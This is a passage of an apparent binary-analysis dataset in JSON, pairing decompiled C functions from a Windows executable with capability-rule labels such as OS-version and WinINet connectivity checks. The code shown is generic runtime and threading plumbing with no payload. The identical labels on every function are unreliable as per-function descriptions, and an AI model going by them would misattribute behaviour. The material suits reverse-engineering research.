uStackY124 = 0x41e812;\n    uStackY128 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff80;\n    puStackY120 = &stack0xfffffffc;\n    iVar2 = fcn.004198f4();\n    if (iVar2 < 0) {\n        fcn.00419740();\n    }\n    in_EAX[10] = in_EAX[6];\n    *(in_EAX[6] + 0x1c) = *(in_EAX[6] + 0x1c) | 1;\n    *(in_EAX[6] + 0x1c) = *(in_EAX[6] + 0x1c) | 2;\n    (**(*in_EAX[6] + 0x14))();\n    *(in_EAX[6] + 0x1c) = *(in_EAX[6] + 0x1c) & 0xfffd;\n    if ((iVar1 == 0) && (iVar2 = *(in_EAX[0xd] + 8),  -1 < iVar2 + -1)) {\n        do {\n            piVar3 = fcn.00419898();\n            (**(*piVar3 + 0xc))();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    *in_FS_OFFSET = uStackY128;\n    puStackY120 = 0x41e819;\n    if (iVar1 == 0) {\n        uStackY124 = 0x41e809;\n        fcn.00404650();\n    }\n    in_EAX[0xd] = 0;\n    return;\n}\n",
        "token_count": 1294
    },
    "0041e904": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041e963)\n// WARNING: Removing unreachable block (ram,0x0041e972)\n\nvoid fcn.0041e904(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    puStack40 = &stack0xfffffffc;\n    uStack32 = 0x41e9ae;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack44 = 0x41e981;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    cVar1 = fcn.0041ebc0();\n    if (cVar1 != '\\v') {\n        fcn.0041ca68();\n    }\n    fcn.004164e8();\n    fcn.0041e9e4();\n    *in_FS_OFFSET = uStack48;\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x41e9b5;\n    uStack32 = 0x41e9ad;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 317
    },
    "0041ebd4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041ebd4(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    uStack20 = 0x41ec10;\n    fcn.0041e9e4();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x41ec17;\n    uStack20 = 0x41ec0f;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 151
    },
    "0041ef70": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0041ef70(uint param_1)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    uVar1 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    fcn.004055c8();\n    var_8h = 0;\n    if (*(in_EAX + 0x1c) != 0) {\n        var_8h = fcn.004204e4();\n    }\n    if (var_8h == 0) {\n        if (*(in_EAX + 0x5a) != 0) {\n            (**(in_EAX + 0x58))(&var_8h, param_1);\n        }\n        if (var_8h == 0) {\n            var_10h = var_4h;\n            var_ch._0_1_ = 0xb;\n            uVar1 = 0;\n            fcn.0040dbf4(0, &var_10h);\n            fcn.00404ec4();\n        }\n    }\n    *in_FS_OFFSET = uVar1;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 312
    },
    "0041f068": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0041f068(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iStack12;\n    \n    iStack12 = fcn.0041cf84();\n    if (((iStack12 == 0) && (*(in_EAX + 0x1c) != 0)) && (*(in_EAX + 0x1c) != *(in_EAX + 0x18))) {\n        iStack12 = fcn.0041cf84();\n    }\n    if (*(in_EAX + 0x6a) != 0) {\n        (**(in_EAX + 0x68))(&iStack12);\n    }\n    if (iStack12 != 0) {\n        cVar1 = fcn.0040487c();\n        if (cVar1 != '\\0') goto code_r0x0041f0d2;\n    }\n    fcn.00418f38();\ncode_r0x0041f0d2:\n    return CONCAT44(iStack12, iStack12);\n}\n",
        "token_count": 231
    },
    "0041f71c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041f71c(void)\n\n{\n    sub.kernel32.dll_InitializeCriticalSection(0x4999d0);\n    *0x4999b8 = sub.kernel32.dll_CreateEventA(0, 0xffffffff, 0, 0x41f74c);\n    if (*0x4999b8 == 0) {\n        fcn.0040f26c();\n    }\n    return;\n}\n",
        "token_count": 93
    },
    "0041f7b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0041f7b4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStackY108;\n    uint uStackY104;\n    uchar *puStackY100;\n    uint uStackY96;\n    uint uStackY92;\n    uchar *puStackY88;\n    uint uStackY84;\n    uint uStackY80;\n    uint uStackY76;\n    uchar *puStackY72;\n    uint uStackY68;\n    uint uStackY64;\n    uint uStackY60;\n    uint uStackY56;\n    uchar *puStackY52;\n    uint uStackY48;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t *var_8h;\n    uint var_1h;\n    \n    puStackY100 = &fcn.0041f7b4::var_1h + 1;\n    iVar1 = sub.kernel32.dll_GetCurrentThreadId_1();\n    if (iVar1 != **0x494d20) {\n        var_14h = sub.kernel32.dll_GetCurrentThreadId_1();\n        var_10h._0_1_ = 0;\n        uStackY48 = 0x41f7f2;\n        fcn.0040dbf4(0, &fcn.0041f7b4::var_14h);\n        uStackY48 = 0x41f7f7;\n        fcn.00404ec4();\n    }\n    if (in_EAX < 1) {\n        uStackY48 = 0x41f809;\n        fcn.0041f768();\n    }\n    else {\n        uStackY48 = 0x41f802;\n        fcn.0041f774();\n    }\n    var_ch = 0;\n    uStackY48 = 0x4999d0;\n    puStackY52 = 0x41f818;\n    sub.kernel32.dll_EnterCriticalSection();\n    uStackY56 = 0x41f979;\n    uStackY60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    uStackY64 = var_ch;\n    uStackY68 = 0x491b2c;\n    puStackY72 = 0x41f834;\n    puStackY52 = &fcn.0041f7b4::var_1h + 1;\n    var_ch = sub.kernel32.dll_InterlockedExchange();\n    uStackY76 = 0x41f95a;\n    uStackY80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    if ((var_ch == 0) || (*(var_ch + 8) < 1)) {\n        var_1h._0_1_ = '\\0';\n    }\n    else {\n        var_1h._0_1_ = '\\x01';\n    }\n    if ((var_1h != '\\0') && (0 < *(var_ch + 8))) {\n        uStackY84 = 0x41f876;\n        puStackY72 = &fcn.0041f7b4::var_1h + 1;\n        var_8h = fcn.00419898();\n        uStackY84 = 0x41f883;\n        fcn.0041978c();\n        uStackY84 = 0x4999d0;\n        puStackY88 = 0x41f88d;\n        sub.kernel32.dll_LeaveCriticalSection();\n        uStackY92 = 0x41f8fd;\n        uStackY96 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffa0;\n        uStackY104 = 0x41f8be;\n        uStackY108 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff94;\n        puStackY88 = &fcn.0041f7b4::var_1h + 1;\n        (**(*var_8h + 8))();\n        *in_FS_OFFSET = uStackY108;\n        *in_FS_OFFSET = uStackY96;\n        puStackY88 = 0x41f904;\n        uStackY92 = 0x4999d0;\n        uStackY96 = 0x41f8fc;\n        sub.kernel32.dll_EnterCriticalSection();\n        return;\n    }\n    *in_FS_OFFSET = uStackY80;\n    puStackY72 = 0x41f961;\n    uStackY76 = 0x41f959;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 1044
    },
    "0041f98c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041f98c noreturn (void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x41fa23;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if (*(in_EAX + 0xd) == '\\0') {\n        uStack40 = 0x41f9cd;\n        uStack44 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd4;\n        puStack36 = &stack0xfffffffc;\n        (**(*in_EAX + 4))();\n        *in_FS_OFFSET = uStack44;\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x41fa2a;\n    cVar1 = *(in_EAX + 0xf);\n    uStack28 = 0x41fa03;\n    (***in_EAX)();\n    *(in_EAX + 4) = 1;\n    uStack28 = 0x41fa0f;\n    fcn.0041f790();\n    if (cVar1 != '\\0') {\n        uStack28 = 0x41fa1b;\n        fcn.00404650();\n    }\n    // WARNING: Subroutine does not return\n    uStack28 = 0x41fa22;\n    fcn.00405514();\n}\n",
        "token_count": 373
    },
    "0041fc6c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041fc6c(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t **ppiVar1;\n    int32_t in_EDX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint uStack20;\n    \n    uStack20 = 0x4999d0;\n    puStack24 = 0x41fc7e;\n    sub.kernel32.dll_EnterCriticalSection();\n    uStack28 = 0x41fd1e;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if ((*0x491b2c != 0) && (iVar2 = *(*0x491b2c + 8) + -1,  puStack24 = &stack0xfffffffc,  -1 < iVar2)) {\n        do {\n            ppiVar1 = fcn.00419898();\n            if ((ppiVar1[2] == NULL) &&\n               (((in_EDX != 0 && (in_EDX == **ppiVar1)) ||\n                ((arg_8h._2_2_ != 0 && (((*ppiVar1)[2] == arg_8h && ((*ppiVar1)[3] == arg_ch)))))))) {\n                fcn.0041978c();\n                fcn.00402f1c();\n                fcn.00402f1c();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x41fd25;\n    uStack28 = 0x4999d0;\n    uStack32 = 0x41fd1d;\n    sub.kernel32.dll_LeaveCriticalSection();\n    return;\n}\n",
        "token_count": 411
    },
    "0041fd2c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0041fd2c(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint uStack80;\n    int32_t iStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint uStack64;\n    int32_t iStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint var_18h;\n    int32_t *var_ch;\n    int32_t var_5h;\n    \n    uStack36 = 0x41fd3e;\n    unique0x10000124 = param_2;\n    iVar1 = sub.kernel32.dll_GetCurrentThreadId_1();\n    if (iVar1 == **0x494d20) {\n        uStack36 = 0x41fd51;\n        (**(stack0xfffffff8 + 8))();\n        return;\n    }\n    if (var_5h == 0) {\n        var_ch = &fcn.0041fd2c::var_18h;\n    }\n    else {\n        uStack36 = 0x41fd66;\n        var_ch = fcn.00402f00();\n    }\n    uVar2 = var_5h ^ 1;\n    if (uVar2 == 0) {\n        var_ch[2] = 0;\n    }\n    else {\n        uStack36 = 0;\n        uStack40 = 0;\n        uStack44 = 0xffffffff;\n        uStack48 = 0;\n        puStack52 = 0x41fd89;\n        iVar1 = sub.kernel32.dll_CreateEventA();\n        var_ch[2] = iVar1;\n    }\n    uStack56 = 0x41fea2;\n    iStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    uStack64 = 0x4999d0;\n    puStack68 = 0x41fdb1;\n    puStack52 = &stack0xfffffffc;\n    sub.kernel32.dll_EnterCriticalSection();\n    uStack72 = 0x41fe7b;\n    iStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    *(var_ch + 1) = var_5h;\n    puStack68 = &stack0xfffffffc;\n    if (*0x491b2c == 0) {\n        uStack80 = 0x41fdde;\n        puStack68 = &stack0xfffffffc;\n        *0x491b2c = fcn.00404620();\n    }\n    *var_ch = stack0xfffffff8;\n    uStack80 = 0x41fdf8;\n    fcn.00419740();\n    uStack80 = 0x41fdfd;\n    fcn.0041f790();\n    if (*0x491b1a != 0) {\n        uStack80 = 0x41fe1a;\n        (**0x491b18)();\n    }\n    if (uVar2 != 0) {\n        uStack80 = 0x4999d0;\n        puStack84 = 0x41fe28;\n        sub.kernel32.dll_LeaveCriticalSection();\n        uStack88 = 0x41fe5c;\n        iStack92 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffa4;\n        iVar1 = var_ch[2];\n        puStack84 = &stack0xfffffffc;\n        sub.kernel32.dll_WaitForSingleObject(iVar1, 0xffffffff);\n        *in_FS_OFFSET = iVar1;\n        iStack92 = 0x41fe63;\n        sub.kernel32.dll_EnterCriticalSection(0x4999d0);\n        return;\n    }\n    *in_FS_OFFSET = iStack76;\n    puStack68 = 0x41fe82;\n    uStack72 = 0x4999d0;\n    iStack76 = 0x41fe7a;\n    sub.kernel32.dll_LeaveCriticalSection();\n    return;\n}\n",
        "token_count": 940
    },
    "00420010": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00420010(void)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    char extraout_DL;\n    \n    iVar1 = fcn.00404a1c();\n    fcn.00420278();\n    if (*(iVar1 + 0x14) != 0) {\n        while ((*(iVar1 + 0x14) != 0 && (0 < *(*(iVar1 + 0x14) + 8)))) {\n            piVar2 = fcn.00419898();\n            (**(*piVar2 + 0x10))();\n        }\n        fcn.0040f944();\n    }\n    fcn.0042021c();\n    if (*(iVar1 + 4) != 0) {\n        fcn.004201e4();\n    }\n    fcn.00419e14();\n    if ('\\0' < extraout_DL) {\n        fcn.004049c4();\n    }\n    return;\n}\n",
        "token_count": 212
    },
    "00420098": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00420098(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    \n    if ((*(in_EAX + 4) == 0) || (*(in_EAX + 4) != *(param_2 + 4))) {\n        if (*(in_EAX + 0x14) == 0) {\n            uVar1 = fcn.00404620();\n            *(in_EAX + 0x14) = uVar1;\n        }\n        iVar2 = fcn.004198f4();\n        if (iVar2 < 0) {\n            fcn.00419740();\n            fcn.00420098();\n        }\n    }\n    *(in_EAX + 0x1c) = *(in_EAX + 0x1c) | 0x100;\n    return;\n}\n",
        "token_count": 202
    },
    "0042012c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042012c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (*(in_EAX + 0x10) == 0) {\n        uVar1 = fcn.00404620();\n        *(in_EAX + 0x10) = uVar1;\n    }\n    fcn.00419740();\n    *(param_2 + 4) = in_EAX;\n    return;\n}\n",
        "token_count": 112
    },
    "00420158": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00420158(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    *(param_2 + 4) = 0;\n    fcn.004199dc();\n    if (*(*(in_EAX + 0x10) + 8) == 0) {\n        fcn.00404650();\n        *(in_EAX + 0x10) = 0;\n    }\n    return;\n}\n",
        "token_count": 104
    },
    "004202b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004202b4(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x14) != 0) {\n        fcn.004199dc();\n        if (*(*(in_EAX + 0x14) + 8) == 0) {\n            fcn.00404650();\n            *(in_EAX + 0x14) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 99
    },
    "0042044c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0042044c(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t in_EDX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (in_EDX != 0) {\n        cVar1 = fcn.00409a84();\n        if ((cVar1 == '\\0') && (in_EAX == *(in_EDX + 4))) {\n            iVar2 = fcn.004204e4();\n            if (iVar2 != 0) {\n                var_ch = arg_8h;\n                var_8h._0_1_ = 0xb;\n                fcn.0040dbf4(0, &var_ch);\n                fcn.00404ec4();\n            }\n        }\n    }\n    if (((*(in_EAX + 0x1c) & 0x10) != 0) && (*(in_EAX + 4) != 0)) {\n        (**(**(in_EAX + 4) + 0x20))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 269
    },
    "004204e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004204e4(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (((param_2 != 0) && (*(in_EAX + 0x10) != 0)) && (iVar3 = *(*(in_EAX + 0x10) + 8),  -1 < iVar3 + -1)) {\n        do {\n            uVar2 = fcn.00419898();\n            cVar1 = fcn.00409a84();\n            if (cVar1 != '\\0') goto code_r0x00420529;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    uVar2 = 0;\ncode_r0x00420529:\n    return CONCAT44(param_2, uVar2);\n}\n",
        "token_count": 206
    },
    "004205d8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004205d8(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x10) == 0) {\n        fcn.00419824();\n    }\n    fcn.00419898();\n    return;\n}\n",
        "token_count": 60
    },
    "00420668": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00420668(char param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (param_2 == '\\0') {\n        *(in_EAX + 0x1c) = *(in_EAX + 0x1c) & 0xffef;\n    }\n    else {\n        *(in_EAX + 0x1c) = *(in_EAX + 0x1c) | 0x10;\n    }\n    if ((param_1 != '\\0') && (iVar1 = fcn.00420604(),  -1 < iVar1 + -1)) {\n        do {\n            fcn.004205d8();\n            fcn.00420668();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 194
    },
    "00420770": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00420770(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint uVar2;\n    \n    if (*(arg_8h + 0x20) == 0) {\n        cVar1 = fcn.00404704();\n        if (cVar1 == '\\0') {\n            uVar2 = 0x80004002;\n        }\n        else {\n            uVar2 = 0;\n        }\n    }\n    else {\n        uVar2 = (****(arg_8h + 0x20))(*(arg_8h + 0x20), arg_ch, arg_10h);\n    }\n    return uVar2;\n}\n",
        "token_count": 161
    },
    "0042092c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042092c(void)\n\n{\n    int32_t iVar1;\n    char extraout_DL;\n    \n    iVar1 = fcn.00404a1c();\n    fcn.00420010();\n    if (*(iVar1 + 0x30) != 0) {\n        fcn.004202d8();\n    }\n    if (*(iVar1 + 0x50) != 0) {\n        while (0 < *(*(iVar1 + 0x50) + 8)) {\n            fcn.00419980();\n            fcn.00420a74();\n        }\n    }\n    fcn.0040f944();\n    if ('\\0' < extraout_DL) {\n        fcn.004049c4();\n    }\n    return;\n}\n",
        "token_count": 166
    },
    "004209c0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004209c0(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x42) != 0) {\n        (**(in_EAX + 0x40))();\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 64
    },
    "004209dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004209dc(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x4a) != 0) {\n        (**(in_EAX + 0x48))();\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 64
    },
    "00420b64": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00420b64(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint *arg_14h)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x420bb3;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    if (arg_ch == 0) {\n        uVar1 = 0x80030009;\n        *in_FS_OFFSET = uStack28;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 0xc) + 0xc))();\n        if (arg_14h != NULL) {\n            *arg_14h = uVar1;\n        }\n        uVar1 = 0;\n        *in_FS_OFFSET = uStack28;\n    }\n    return uVar1;\n}\n",
        "token_count": 227
    },
    "00420bcc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00420bcc(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint *arg_14h)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x420c1b;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    if (arg_ch == 0) {\n        uVar1 = 0x80030009;\n        *in_FS_OFFSET = uStack28;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 0xc) + 0x10))();\n        if (arg_14h != NULL) {\n            *arg_14h = uVar1;\n        }\n        uVar1 = 0;\n        *in_FS_OFFSET = uStack28;\n    }\n    return uVar1;\n}\n",
        "token_count": 228
    },
    "00420d1c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
